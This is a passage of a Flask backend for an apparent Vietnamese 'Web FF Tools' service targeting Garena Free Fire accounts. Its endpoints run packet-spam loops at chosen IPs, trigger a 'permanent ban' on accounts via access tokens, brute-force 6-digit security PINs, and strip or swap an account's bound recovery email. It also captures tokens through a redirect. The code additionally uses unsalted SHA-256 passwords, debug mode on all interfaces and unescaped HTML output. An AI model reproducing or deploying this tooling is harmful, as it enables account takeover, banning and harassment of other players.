            return jsonify({'success': False, 'error': 'Không có tiến trình nào đang chạy cho tài khoản này'})

        else:
            return jsonify({'success': False, 'error': 'Hành động không hợp lệ'})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/spam_status', methods=['GET'])
def spam_status():
    """Get spam log status - WebCu style for polling"""
    try:
        # Check if user is logged in
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Chưa xác thực'})

        username = session.get('username')

        # Check cache for resurrection if server crashed
        if username not in active_spams:
            cache = load_spam_cache()
            c_item = cache.get(str(username))
            if c_item and c_item.get('status') == 'running' and c_item.get('end_time', 0) > time.time():
                stop_event = threading.Event()
                pkt_data = c_item.get('packet')
                if pkt_data:
                    try:
                        pkt_data = bytes.fromhex(pkt_data)
                    except:
                        pass

                active_spams[username] = {
                    'at': c_item.get('at'),
                    'stop_event': stop_event,
                    'status': 'running',
                    'sent': c_item.get('sent', 0),
                    'ok': c_item.get('ok', 0),
                    'fail': c_item.get('fail', 0),
                    'ip': c_item.get('ip'),
                    'port': c_item.get('port'),
                    'end_time': c_item.get('end_time'),
                    'packet': pkt_data,
                    'interval': c_item.get('interval', 500),
                    'total_ms': c_item.get('total_ms', 10000)
                }

                # Resurrect thread
                thread = threading.Thread(
                    target=spam_loop,
                    args=(username, c_item.get('ip'), c_item.get('port'), pkt_data, c_item.get('interval'), c_item.get('end_time'), stop_event)
                )
                thread.daemon = True
                thread.start()

        if username not in active_spams:
            return jsonify({'success': True, 'status': 'idle'})

        s = active_spams[username]
        save_spam_cache(active_spams)  # Update cache continuously

        return jsonify({
            'success': True,
            'status': s['status'],
            'sent': s['sent'],
            'ok': s['ok'],
            'fail': s['fail'],
            'ip': s['ip'],
            'port': s['port'],
            'total_ms': s.get('total_ms', 10000),
            'remaining_ms': max(0, int((s['end_time'] - time.time()) * 1000))
        })

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/permanent_ban', methods=['POST'])
def permanent_ban():
    """Endpoint to start permanent ban background task"""
    try:
        # Check if user is logged in
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        data = request.json
        access_token = data.get('access_token')

        if not access_token:
            return jsonify({'success': False, 'error': 'Access token là bắt buộc'})

        # Check usage limit
        usage = get_user_usage(username)
        if usage.get('permanent_ban', 0) >= 999:
            return jsonify({
                'success': False,
                'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
            })

        # If already running, don't start again
        if username in active_permanent_bans and active_permanent_bans[username]['status'] == 'running':
            return jsonify({'success': False, 'error': 'Tiến trình đang chạy rồi'})

        # Initialize state
        active_permanent_bans[username] = {
            'status': 'running',
            'progress': 0,
            'message': 'Đang chuẩn bị...',
            'at': access_token
        }

        # Start thread
        thread = threading.Thread(
            target=permanent_ban_loop,
            args=(username, access_token)
        )
        thread.daemon = True
        thread.start()

        # Update usage
        update_user_usage(username, 'permanent_ban')
        save_permanent_ban_cache(active_permanent_bans)

        return jsonify({'success': True})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/permanent_ban_status', methods=['GET'])
def permanent_ban_status():
    """Get permanent ban status - polling endpoint"""
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Chưa xác thực'})

        username = session.get('username')

        # Check cache if not in memory
        if username not in active_permanent_bans:
            cache = load_permanent_ban_cache()
            c_item = cache.get(str(username))
            if c_item:
                return jsonify({
                    'success': True,
                    'status': c_item.get('status'),
                    'progress': c_item.get('progress'),
                    'message': c_item.get('message')
                })
            return jsonify({'success': True, 'status': 'idle'})

        s = active_permanent_bans[username]
        return jsonify({
            'success': True,
            'status': s['status'],
            'progress': s.get('progress', 0),
            'message': s.get('message', '')
        })

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/brute_force_pin', methods=['POST'])
def brute_force_pin():
    """Endpoint to start/stop brute force pin background task"""
    try:
        # Check if user is logged in
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        data = request.json
        action = data.get('action', 'start')

        if action == 'start':
            # Check usage limit
            usage = get_user_usage(username)
            if usage.get('brute_force', 0) >= 999:
                return jsonify({
                    'success': False,
                    'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
                })

            access_token = data.get('access_token')
            if not access_token:
                return jsonify({'success': False, 'error': 'Access token là bắt buộc'})

            # If already running, don't start again
            if username in active_brute_forces and active_brute_forces[username]['status'] == 'running':
                return jsonify({'success': False, 'error': 'Tiến trình đang chạy rồi'})

            # Initialize state
            stop_event = threading.Event()
            
            # Resume if exists in cache
            cache = load_brute_force_cache()
            c_item = cache.get(str(username))
            
            current_pin = 0
            total_checked = 0
            if c_item and c_item.get('status') != 'found':
                current_pin = c_item.get('current_pin', 0)
                total_checked = c_item.get('total_checked', 0)

            active_brute_forces[username] = {
                'at': access_token,
                'stop_event': stop_event,
                'status': 'running',
                'current_pin': current_pin,
                'total_checked': total_checked
            }

            # Start thread
            thread = threading.Thread(
                target=brute_force_loop,
                args=(username, access_token, stop_event)
            )
            thread.daemon = True
            thread.start()
            brute_force_threads[username] = thread

            # Save to cache
            save_brute_force_cache(active_brute_forces)

            # Update usage
            update_user_usage(username, 'brute_force')

            return jsonify({
                'success': True,
                'status': 'started',
                'current_pin': current_pin
            })

        elif action == 'stop':
            if username in active_brute_forces:
                active_brute_forces[username]['stop_event'].set()
                active_brute_forces[username]['status'] = 'stopped'
                # We don't delete it from memory yet, let the status endpoint handle it or user see it stopped
                save_brute_force_cache(active_brute_forces)
                return jsonify({'success': True, 'message': 'Đã dừng tiến trình thành công'})
            
            return jsonify({'success': False, 'error': 'Không có tiến trình nào đang chạy'})

        else:
            return jsonify({'success': False, 'error': 'Hành động không hợp lệ'})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/brute_force_status', methods=['GET'])
def brute_force_status():
    """Get brute force status - polling endpoint"""
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Chưa xác thực'})

        username = session.get('username')

        # Check cache for resurrection
        if username not in active_brute_forces:
            cache = load_brute_force_cache()
            c_item = cache.get(str(username))
            if c_item and c_item.get('status') == 'running':
                stop_event = threading.Event()
                active_brute_forces[username] = {
                    'at': c_item.get('at'),
                    'stop_event': stop_event,
                    'status': 'running',
                    'current_pin': c_item.get('current_pin', 0),
                    'total_checked': c_item.get('total_checked', 0)
                }

                # Resurrect thread
                thread = threading.Thread(
                    target=brute_force_loop,
                    args=(username, c_item.get('at'), stop_event)
                )
                thread.daemon = True
                thread.start()
                brute_force_threads[username] = thread
            elif c_item:
                # If it's stopped, finished, or found, we can still show the last state from cache
                return jsonify({
                    'success': True,
                    'status': c_item.get('status'),
                    'current_pin': c_item.get('current_pin', 0),
                    'total_checked': c_item.get('total_checked', 0),
                    'found_pin': c_item.get('found_pin')
                })

        if username not in active_brute_forces:
            return jsonify({'success': True, 'status': 'idle'})

        s = active_brute_forces[username]
        
        return jsonify({
            'success': True,
            'status': s['status'],
            'current_pin': s.get('current_pin', 0),
            'total_checked': s.get('total_checked', 0),
            'found_pin': s.get('found_pin'),
            'message': s.get('message')
        })

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/task_status/<task_id>', methods=['GET'])
def task_status(task_id):
    try:
        task = get_task_status(task_id)
        if not task:
            return jsonify({'success': False, 'error': 'Không tìm thấy tác vụ'})
        
        return jsonify({
            'success': True,
            'task': task
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/long_bio', methods=['POST'])
def long_bio():
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        usage = get_user_usage(username)
        if usage.get('long_bio', 0) >= 999:
            return jsonify({
                'success': False,
                'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
            })

        data = request.json
        jwt_token = data.get('jwt_token')
        bio_text = data.get('bio_text')
        method = data.get('method', 'jwt')  # jwt, access, guest
        access_token = data.get('access_token')
        uid = data.get('uid')
        password = data.get('password')
        
        if not bio_text:
            return jsonify({'success': False, 'error': 'Nội dung tiểu sử là bắt buộc'})
        
        # Get JWT based on method
        if method == 'access':
            if not access_token:
                return jsonify({'success': False, 'error': 'Vui lòng cung cấp Access Token'})
            open_id, platform = inspect_token(access_token)
            jwt_token, _, _ = do_major_login(open_id, access_token, platform)
        elif method == 'guest':
            if not uid or not password:
                return jsonify({'success': False, 'error': 'UID và mật khẩu là bắt buộc'})
            open_id, at = guest_get_access(uid, password)
            if not open_id or not at:
                return jsonify({'success': False, 'error': 'Đăng nhập khách thất bại'})
            jwt_token, _, _ = do_major_login(open_id, at, 4)
        elif method == 'jwt':
            if not jwt_token:
                return jsonify({'success': False, 'error': 'Vui lòng cung cấp JWT Token'})
        else:
            return jsonify({'success': False, 'error': 'Phương thức không hợp lệ'})
        
        # Build Protobuf Payload
        pl = bytearray()
        pl += _int_field(2, 17)
        pl += _str_field(5, b'')
        pl += _str_field(6, b'')
        pl += _str_field(8, bio_text)
        pl += _int_field(9, 1)
        pl += _str_field(11, b'')
        pl += _str_field(12, b'')
        
        enc = aes_encrypt(bytes(pl))
        
        headers = {
            "Expect": "100-continue",
            "X-Unity-Version": "2018.4.11f1",
            "X-GA": "v1 1",
            "ReleaseVersion": "OB54",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F Build/RP1A.200720.012)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Authorization": f"Bearer {jwt_token}"
        }
        
        r = requests.post("https://clientbp.ggpolarbear.com/UpdateSocialBasicInfo", 
                         headers=headers, data=enc, timeout=20, verify=True)
        
        if r.status_code == 200:
            update_user_usage(username, 'long_bio')
            return jsonify({'success': True, 'message': 'Cập nhật tiểu sử thành công'})
        elif r.status_code == 401:
            return jsonify({'success': False, 'error': 'JWT không hợp lệ hoặc đã hết hạn'})
        else:
            return jsonify({'success': False, 'error': f'Lỗi máy chủ: {r.status_code}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send_otp_add_recovery', methods=['POST'])
def send_otp_add_recovery():
    try:
        data = request.json
        email = data.get('email', '').strip()
        access_token = data.get('access_token', '').strip()
        
        if not email or not access_token:
            return jsonify({'success': False, 'error': 'Email và Access Token là bắt buộc'})
        
        resp = send_otp(email, access_token)
        
        if not resp:
            return jsonify({'success': False, 'error': 'Không thể kết nối đến máy chủ Garena'})

        res_text = resp.text.replace(" ", "")
        if '"result":0' in res_text:
            return jsonify({'success': True, 'message': 'Mã OTP đã được gửi'})
        else:
            try:
                err_data = resp.json()
                error_msg = err_data.get('error', resp.text)
                return jsonify({'success': False, 'error': f'Gửi OTP thất bại: {error_msg}'})
            except:
                return jsonify({'success': False, 'error': f'Gửi OTP thất bại: {resp.text}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify_otp_add_recovery', methods=['POST'])
def verify_otp_add_recovery():
    try:
        data = request.json
        email = data.get('email')
        access_token = data.get('access_token')
        otp = data.get('otp')
        
        if not all([email, access_token, otp]):
            return jsonify({'success': False, 'error': 'Email, Access Token và OTP là bắt buộc'})
        
        vr = verify_otp(otp, email, access_token)
        if vr.status_code != 200:
            return jsonify({'success': False, 'error': 'Xác thực OTP thất bại'})
        
        verifier_token = vr.json().get("verifier_token")
        if not verifier_token:
            return jsonify({'success': False, 'error': 'Không tìm thấy Verifier Token'})
        
        return jsonify({'success': True, 'message': 'Xác thực OTP thành công', 'verifier_token': verifier_token})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send_otp_unbind', methods=['POST'])
def send_otp_unbind():
    try:
        data = request.json
        email = data.get('email', '').strip()
        access_token = data.get('access_token', '').strip()
        
        if not email or not access_token:
            return jsonify({'success': False, 'error': 'Email và Access Token là bắt buộc'})
        
        resp = send_otp(email, access_token)
        
        if not resp:
            return jsonify({'success': False, 'error': 'Không thể kết nối đến máy chủ Garena'})
            
        res_text = resp.text.replace(" ", "")
        if '"result":0' in res_text:
            return jsonify({'success': True, 'message': 'Mã OTP đã gửi đến email của bạn'})
        else:
            # Try to parse error message if available
            try:
                err_data = resp.json()
                error_msg = err_data.get('error', resp.text)
                return jsonify({'success': False, 'error': f'Gửi OTP thất bại: {error_msg}'})
            except:
                return jsonify({'success': False, 'error': f'Gửi OTP thất bại: {resp.text}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send_otp_change_old', methods=['POST'])
def send_otp_change_old():
    try:
        data = request.json
        old_email = data.get('old_email', '').strip()
        access_token = data.get('access_token', '').strip()
        
        if not old_email or not access_token:
            return jsonify({'success': False, 'error': 'Email cũ và Access Token là bắt buộc'})
        
        resp = send_otp(old_email, access_token)
        
        if not resp:
            return jsonify({'success': False, 'error': 'Không thể kết nối đến máy chủ Garena'})

        if '"result":0' in resp.text.replace(" ", ""):
            return jsonify({'success': True, 'message': 'Mã OTP đã gửi đến email cũ'})
        else:
            try:
                err_data = resp.json()
                error_msg = err_data.get('error', resp.text)
                return jsonify({'success': False, 'error': f'Gửi OTP thất bại: {error_msg}'})
            except:
                return jsonify({'success': False, 'error': f'Gửi OTP thất bại: {resp.text}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send_otp_change_new', methods=['POST'])
def send_otp_change_new():
    try:
        data = request.json
        new_email = data.get('new_email', '').strip()
        access_token = data.get('access_token', '').strip()
        
        if not new_email or not access_token:
            return jsonify({'success': False, 'error': 'Email mới và Access Token là bắt buộc'})
        
        resp = send_otp(new_email, access_token)
        
        if not resp:
            return jsonify({'success': False, 'error': 'Không thể kết nối đến máy chủ Garena'})
        
        if '"result":0' in resp.text.replace(" ", ""):
            return jsonify({'success': True, 'message': 'Mã OTP đã gửi đến email mới'})
        else:
            try:
                err_data = resp.json()
                error_msg = err_data.get('error', resp.text)
                return jsonify({'success': False, 'error': f'Gửi OTP thất bại: {error_msg}'})
            except:
                return jsonify({'success': False, 'error': f'Gửi OTP thất bại: {resp.text}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/unbind_email', methods=['POST'])
def unbind_email():
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        usage = get_user_usage(username)
        if usage.get('unbind_email', 0) >= 999:
            return jsonify({
                'success': False,
                'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
            })

        data = request.json
        email = data.get('email', '').strip()
        access_token = data.get('access_token', '').strip()
        method = data.get('method', 'otp')  # otp or password
        otp = data.get('otp', '').strip()
        security_code = data.get('security_code', '').strip()
        
        if not email or not access_token:
            return jsonify({'success': False, 'error': 'Email và Access Token là bắt buộc'})
        
        identity_token = None
        
        if method == 'otp':
            if not otp:
                return jsonify({'success': False, 'error': 'Vui lòng nhập mã OTP'})
            # Verify OTP
            r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                             headers=GARENA_HEADERS,
                             data={"email": email, "otp": otp, "app_id": "100067", 
                                    "access_token": access_token})
            identity_token = r.json().get("identity_token")
        elif method == 'password':
            if not security_code or len(security_code) != 6 or not security_code.isdigit():
                return jsonify({'success': False, 'error': 'Mã bảo mật phải là 6 chữ số'})
            hashed_sp = hashlib.sha256(security_code.encode('utf-8')).hexdigest().upper()
            r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                             headers=GARENA_HEADERS,
                             data={"email": email, "secondary_password": hashed_sp, 
                                    "app_id": "100067", "access_token": access_token})
            identity_token = r.json().get("identity_token")
        
        if not identity_token:
            return jsonify({'success': False, 'error': f'Không lấy được mã xác thực danh tính: {r.text}'})
        
        # Create unbind request
        resp = requests.post("https://100067.connect.garena.com/game/account_security/bind:create_unbind_request",
                           headers=GARENA_HEADERS,
                           data={"app_id": "100067", "access_token": access_token, 
                                  "identity_token": identity_token})
        
        if '"result":0' in resp.text.replace(" ", ""):
            update_user_usage(username, 'unbind_email')
            return jsonify({'success': True, 'message': 'Yêu cầu gỡ email đã được tạo thành công'})
        else:
            return jsonify({'success': False, 'error': f'Thất bại: {resp.text}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/change_bind_email', methods=['POST'])
def change_bind_email():
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        usage = get_user_usage(username)
        if usage.get('change_bind_email', 0) >= 999:
            return jsonify({
                'success': False,
                'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
            })

        data = request.json
        access_token = data.get('access_token', '').strip()
        old_email = data.get('old_email', '').strip()
        new_email = data.get('new_email', '').strip()
        method = data.get('method', 'otp')  # otp or password
        otp_old = data.get('otp_old', '').strip()
        security_code = data.get('security_code', '').strip()
        otp_new = data.get('otp_new', '').strip()
        
        if not all([access_token, old_email, new_email]):
            return jsonify({'success': False, 'error': 'Thiếu thông tin: Access Token, email cũ hoặc email mới'})
        
        identity_token = None
        
        if method == 'otp':
            if not otp_old:
                return jsonify({'success': False, 'error': 'Vui lòng nhập mã OTP cho email cũ'})
            # Verify old OTP / Verify Identity
            r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                             headers=GARENA_HEADERS,
                             data={'email': old_email, 'app_id': '100067', 
                                    'access_token': access_token, 'otp': otp_old})
            res_json = r.json()
            identity_token = res_json.get("identity_token")
            if not identity_token:
                return jsonify({'success': False, 'error': f"Không lấy được mã xác thực danh tính: {r.text}"})
        elif method == 'password':
            if not security_code or len(security_code) != 6 or not security_code.isdigit():
                return jsonify({'success': False, 'error': 'Mã bảo mật phải là 6 chữ số'})
            hashed_sp = hashlib.sha256(security_code.encode('utf-8')).hexdigest().upper()
            r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                             headers=GARENA_HEADERS,
                             data={'email': old_email, 'secondary_password': hashed_sp, 
                                    'app_id': '100067', 'access_token': access_token})
            res_json = r.json()
            identity_token = res_json.get("identity_token")
            if not identity_token:
                return jsonify({'success': False, 'error': f"Không lấy được mã xác thực danh tính: {r.text}"})
        
        if not otp_new:
            return jsonify({'success': False, 'error': 'Vui lòng nhập mã OTP cho email mới'})
        
        # Verify new OTP to get verifier_token
        # NOTE: In Garena's flow, verify_otp on the NEW email returns a verifier_token
        r_otp = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_otp",
                        headers=GARENA_HEADERS,
                        data={'email': new_email, 'app_id': '100067', 
                               'access_token': access_token, 'otp': otp_new})
        otp_json = r_otp.json()
        verifier_token = otp_json.get("verifier_token")
        
        if not verifier_token:
            return jsonify({'success': False, 'error': f"Không lấy được mã xác minh: {r_otp.text}"})
        
        # Create rebind request using BOTH tokens
        r_rebind = requests.post("https://100067.connect.garena.com/game/account_security/bind:create_rebind_request",
                        headers=GARENA_HEADERS,
                        data={'identity_token': identity_token, 'email': new_email, 
                               'app_id': '100067', 'verifier_token': verifier_token, 
                               'access_token': access_token})
        
        if '"result":0' in r_rebind.text.replace(" ", ""):
            update_user_usage(username, 'change_bind_email')
            return jsonify({'success': True, 'message': 'Đã tạo yêu cầu thay đổi email thành công. Vui lòng kiểm tra email mới để xác nhận.'})
        else:
            return jsonify({'success': False, 'error': f"Thay đổi email thất bại: {r_rebind.text}"})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Authentication routes
@app.route('/auth')
def auth_page():
    return render_template('auth.html')

@app.route('/register')
def register_page():
    return render_template('register.html')

@app.route('/api/login', methods=['POST'])
def login():
    try:
        data = request.json
        login_input = data.get('username')  # Could be username or email
        password = data.get('password')
        remember_me = data.get('remember_me', False)
        
        if not login_input or not password:
            return jsonify({'success': False, 'error': 'Tên đăng nhập/email và mật khẩu là bắt buộc'})
        
        # Hash the password
        hashed_password = hashlib.sha256(password.encode('utf-8')).hexdigest()
        
        # Get users from Firebase
        users = firebase_get('/users')
        if not users:
            users = {}
        
        # Find user by username or email
        user = None
        username = None
        for u_name, u_data in users.items():
            if u_name == login_input or u_data.get('email') == login_input:
                user = u_data
                username = u_name
                break
        
        if not user:
            return jsonify({'success': False, 'error': 'Tên đăng nhập/email hoặc mật khẩu không đúng'})
        
        # Check password
        if user.get('password') != hashed_password:
            return jsonify({'success': False, 'error': 'Tên đăng nhập/email hoặc mật khẩu không đúng'})
        
        # Set session
        session['username'] = username
        session['authenticated'] = True
        session['email'] = user.get('email')
        
        # Create response
        response = jsonify({'success': True, 'message': 'Đăng nhập thành công'})
        
        # Set remember me cookie
        if remember_me:
            # Create a remember token
            remember_token = str(uuid.uuid4())
            expires = datetime.now() + timedelta(days=30)
            
            # Store remember token in Firebase
            users[username]['remember_token'] = remember_token
            firebase_update(f'/users/{username}', {'remember_token': remember_token})
            
            # Set cookie
            response.set_cookie('remember_token', remember_token, 
                             expires=expires, 
                             httponly=True, 
                             secure=False,  # Set to True in production with HTTPS
                             samesite='Lax')
        
        return response
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/register', methods=['POST'])
def register():
    try:
        data = request.json
        username = data.get('username')
        email = data.get('email')
        password = data.get('password')
        
        if not all([username, email, password]):
            return jsonify({'success': False, 'error': 'Tất cả các trường đều bắt buộc'})
        
        # Validate username length
        if len(username) < 3 or len(username) > 20:
            return jsonify({'success': False, 'error': 'Tên đăng nhập phải từ 3 đến 20 ký tự'})
        
        # Validate email format
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        if not re.match(email_pattern, email):
            return jsonify({'success': False, 'error': 'Email không hợp lệ'})
        
        # Validate password length
        if len(password) < 6:
            return jsonify({'success': False, 'error': 'Mật khẩu phải có ít nhất 6 ký tự'})
        
        # Get users from Firebase
        users = firebase_get('/users')
        if not users:
            users = {}
        
        # Check if username already exists
        if username in users:
            return jsonify({'success': False, 'error': 'Tên đăng nhập đã tồn tại'})
        
        # Check if email already exists
        for user_data in users.values():
            if user_data.get('email') == email:
                return jsonify({'success': False, 'error': 'Email đã được sử dụng'})
        
        # Hash password
        hashed_password = hashlib.sha256(password.encode('utf-8')).hexdigest()
        
        # Create user in Firebase
        user_data = {
            'username': username,
            'email': email,
            'password': hashed_password,
            'created_at': datetime.now().isoformat(),
            'is_pro': False
        }
        
        # Save user to Firebase
        firebase_set(f'/users/{username}', user_data)
        
        # Initialize usage
        usage_data = {
            'ban7': 0,
            'spam_log': 0,
            'is_pro': False
        }
        firebase_set(f'/usage/{username}', usage_data)
        
        return jsonify({'success': True, 'message': 'Đăng ký thành công'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/check_auth', methods=['GET'])
def check_auth():
    try:
        # Check session
        if session.get('authenticated') and session.get('username'):
            username = session.get('username')
            usage = firebase_get(f'/usage/{username}')
            user = firebase_get(f'/users/{username}')
            if not usage:
                usage = {'ban7': 0, 'spam_log': 0, 'is_pro': False}
            
            

            return jsonify({'authenticated': True, 'username': username, 'email': user.get('email') if user else '', 'usage': usage})

        # Check remember me cookie
        remember_token = request.cookies.get('remember_token')
        if remember_token:
            users = firebase_get('/users')
            if not users:
                users = {}
            for username, user_data in users.items():
                if user_data.get('remember_token') == remember_token:
                    session['username'] = username
                    session['authenticated'] = True
                    session['email'] = user_data.get('email')
                    usage = firebase_get(f'/usage/{username}')
                    if not usage:
                        usage = {'ban7': 0, 'spam_log': 0, 'is_pro': False}

                    

                    return jsonify({'authenticated': True, 'username': username, 'email': user_data.get('email'), 'usage': usage})
        
        return jsonify({'authenticated': False})
    except Exception as e:
        return jsonify({'authenticated': False})

@app.route('/api/logout', methods=['POST'])
def logout():
    try:
        username = session.get('username')
        
        # Clear remember token from Firebase
        if username:
            firebase_update(f'/users/{username}', {'remember_token': None})
        
        # Clear session
        session.clear()
        
        # Create response and clear cookie
        response = jsonify({'success': True, 'message': 'Đăng xuất thành công'})
        response.set_cookie('remember_token', '', expires=0)
        
        return response
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# --- Automated Token Capture ---

@app.route('/api/garena_callback')
def garena_callback():
    """Endpoint to receive token from Garena/Kiosgamer redirect"""
    eat = request.args.get('eat')
    state = request.args.get('state')
    account_id = request.args.get('account_id')
    nickname = request.args.get('nickname')
    
    if not eat or not state:
        return """
        <div style="text-align:center; padding:50px; font-family:sans-serif;">
            <h2 style="color:#ef4444;">Lỗi: Không tìm thấy Token</h2>
            <p>Vui lòng đóng cửa sổ này và thử lại.</p>
        </div>
        """, 400
        
    try:
        # Save to Firebase temp storage
        capture_data = {
            'eat': eat,
            'account_id': account_id,
            'nickname': nickname,
            'timestamp': datetime.now().isoformat()
        }
        firebase_set(f'/temp_tokens/{state}', capture_data)
        
        return f"""
        <div style="text-align:center; padding:50px 20px; font-family:sans-serif; background:#0b0f14; color:white; min-height:100vh; display:flex; align-items:center; justify-content:center;">
            <div style="border: 2px solid #8b5cf6; border-radius: 20px; padding: 30px; background: rgba(139, 92, 246, 0.1); max-width: 400px; width: 100%;">
                <div style="font-size: 50px; margin-bottom: 20px;">✅</div>
                <h2 style="color:#8b5cf6; margin-bottom: 15px;">Đăng nhập thành công!</h2>
                <p style="color: #b0b8c4; line-height: 1.6; margin-bottom: 25px;">
                    Đã lấy được Token cho tài khoản <b>{nickname or 'của bạn'}</b>.<br><br>
                    Hãy <b>đóng Tab này</b> và quay lại trang <b>Web FF Tools</b> để tiếp tục.
                </p>
                <button onclick="window.close()" style="background: linear-gradient(135deg, #a78bfa, #7c3aed); color:white; border:none; padding:15px 30px; border-radius:12px; font-weight:bold; cursor:pointer; width: 100%; font-size: 16px; box-shadow: 0 4px 15px rgba(139, 92, 246, 0.3);">
                    Đóng cửa sổ này
                </button>
                <script>
                    setTimeout(() => {{ window.close(); }}, 4000);
                </script>
            </div>
        </div>
        """
    except Exception as e:
        return str(e), 500

@app.route('/api/check_token_capture')
def check_token_capture():
    """Endpoint for frontend to poll for captured token"""
    state = request.args.get('state')
    if not state:
        return jsonify({'success': False, 'error': 'Missing state'})
        
    try:
        # Try to get from Firebase
        data = firebase_get(f'/temp_tokens/{state}')
        if data:
            # Delete after retrieval to keep it clean (optional)
            # firebase_set(f'/temp_tokens/{state}', None)
            return jsonify({'success': True, 'data': data})
        else:
            return jsonify({'success': False, 'status': 'waiting'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)